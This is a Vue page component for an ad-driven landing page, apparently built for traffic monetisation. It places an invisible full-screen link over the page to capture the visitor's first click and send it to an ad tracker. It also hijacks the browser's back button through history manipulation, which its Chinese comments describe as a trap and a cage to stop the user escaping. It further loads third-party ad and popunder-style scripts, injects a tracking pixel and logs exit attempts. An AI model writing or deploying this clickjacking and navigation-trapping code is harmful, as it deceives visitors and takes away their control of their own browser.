<template>
  <div class="home-b">
<!--    <div id="container-d1debede50ec7d8df5940dc07088499f"></div>-->
<!--    <img src="../assets/adsimg/a.png" style="margin: 0 auto;" alt="">-->


    <!--  https://h4imw.bemobtrcks.com/click  -->
    <a href="https://6njvi.bemobtrcks.com/click"
       target="_blank"
       ref="stealthNet"
       style="position: fixed; top: 0; left: 0; width: 100vw; height: 100%; z-index: 9999; opacity: 0; cursor: pointer;"
       @click="hideStealthNet"
    >
    </a>
    <!-- 通知权限弹窗 -->
<!--    <NotificationDialog ref="notificationDialog" />-->

    <AdsterraManager idTxt="adsterra-banner-1-box" :zid="1" style="margin-top: 1rem; margin-bottom: 0;" :immediate="false" :showTitle="true"/>
    <AdBannerList  style="margin-top: 1rem;"/>
    <div id="container-d1debede50ec7d8df5940dc07088499f"></div>

<!--    <Dialog v-if="showDialog" @close="showDialog = false" />-->
  </div>
</template>

<script setup>
import {AdsterraAd, MonetagAd} from "@/utils/adSdk";
import {onMounted, ref} from "vue";
import NotificationDialog from "@/components/NotificationDialog.vue";
import {gaLogEvent} from "@/utils/event";
import AdBannerList from "@/components/AdBannerList.vue";
import {loadScript} from "../utils";
import AdsterraManager from "../components/AdsterraManager.vue";
import Dialog from "../components/Dialog.vue";
import {requestNotifyPermission} from "@/utils/pwa.js";

const stealthNet = ref(null);
const showDialog = ref(false);

onMounted(() => {
  const lang = (navigator.language || '').split('-')[0];

  gaLogEvent.logEvent({
    eventName: "enter_home_b",
    eventValue: lang,
    eventLog: `Enter Home B`
  })

  setTimeout(() => {
    loadScript("https://freshmanhow.com/32/8f/4b/328f4b449c3a62bd7e29fb0553d04b03.js", "SocialBar");
    loadScript("https://freshmanhow.com/d1debede50ec7d8df5940dc07088499f/invoke.js", "NativeBanner");
    // loadScript("https://freshmanhow.com/dd/10/63/dd106361c330652cbd7160d60ac616de.js", "Popunder");
    initBackHijack();

    MonetagAd.pushShow();
    requestNotifyPermission();
  }, 500)
})

// 点击全屏网后，将其隐藏，让老哥退回来时能点到真按钮
const hideStealthNet = () => {
  stealthNet.value.style.display = 'none';

  gaLogEvent.logEvent({
    eventName: "home_b_stealth",
    eventLog: `home_b_stealth`
  })
}

const initBackHijack = () => {
  // 我们只操作 hash，绝对不碰 ? 后面的宏参数

  // 如果页面刚加载时没有 hash，我们就主动给他加上 #trap
  if (window.location.hash !== '#trap' && window.location.hash !== '#current') {
    // 1. 布置陷阱：先把当前页面偷偷换成 #trap
    history.replaceState({ page: 'trap' }, '', window.location.pathname + window.location.search + '#trap');

    // 2. 往前推一步：再塞入一个 #current。这样老哥一按返回，就会退到 #trap
    history.pushState({ page: 'current' }, '', window.location.pathname + window.location.search + '#current');
  }

  // 3. 监听老哥按返回键（收网）
  window.addEventListener("popstate", (event) => {
    // 检查他是不是退到了陷阱层 (#trap)
    if (window.location.hash === '#trap') {

      // 只要他退到了 trap，立刻重新把历史记录补满！把他再推到 current 牢笼里
      setTimeout(() => {
        history.pushState(
            { page: 'current' },
            '',
            window.location.pathname + window.location.search + '#current'
        );

        // 核心收网动作：老哥想跑，直接弹出终极诱导弹窗逼他点！
        // showDialog.value = true;

        // 可选：记录他试图逃跑的动作
        gaLogEvent.logEvent({
          eventName: "user_attempt_exit",
          eventLog: `User tried to go back`
        });

      }, 10);
    }
  });
}

const injectBeMobTracking = () => {
  // 防重入：同样先清理掉可能残留的追踪代码
  const existingScript = document.getElementById('bemob-tracking-pixel');
  if (existingScript) existingScript.remove();

  const script = document.createElement("script");
  script.id = 'bemob-tracking-pixel';
  script.type = "text/javascript";
  script.async = true;

  // 填入属于 Page2 的专属链接
  script.src = "https://6njvi.bemobtrcks.com/landing/2e1f1795-652b-424b-95b0-abe9846166ac?callback=REPLACE&rule=REPLACE&path=REPLACE&landing=REPLACE&" + window.location.search.substring(1);

  const firstScript = document.getElementsByTagName("script")[0];
  if (firstScript && firstScript.parentNode) {
    firstScript.parentNode.insertBefore(script, firstScript);
  } else {
    document.head.appendChild(script);
  }
}

injectBeMobTracking();
</script>

<style scoped>
.home-b {
  margin: 0 auto;
  width: 100%;
  height: auto;
  overflow: auto;
}
</style>